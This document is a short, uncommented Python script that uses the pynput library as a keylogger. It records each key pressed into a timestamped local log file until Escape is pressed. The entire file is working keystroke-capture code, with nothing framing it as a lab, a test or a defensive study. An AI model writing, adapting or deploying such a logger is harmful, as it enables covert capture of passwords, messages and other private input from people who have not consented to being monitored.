from pynput.keyboard import Key, Listener
import datetime
date=datetime.datetime.now()
with open(f'logs-{date}','a') as file:
    file.write('\n----------------------------------------------\n')
def on_press(key):
    if key==Key.esc:
        return False
    with open(f'logs-{date}','a') as file:
        if key==Key.enter:
            file.write('\n')
        else:
            file.write(' '+str((key)))
with Listener(on_press=on_press) as listener:
    listener.join()

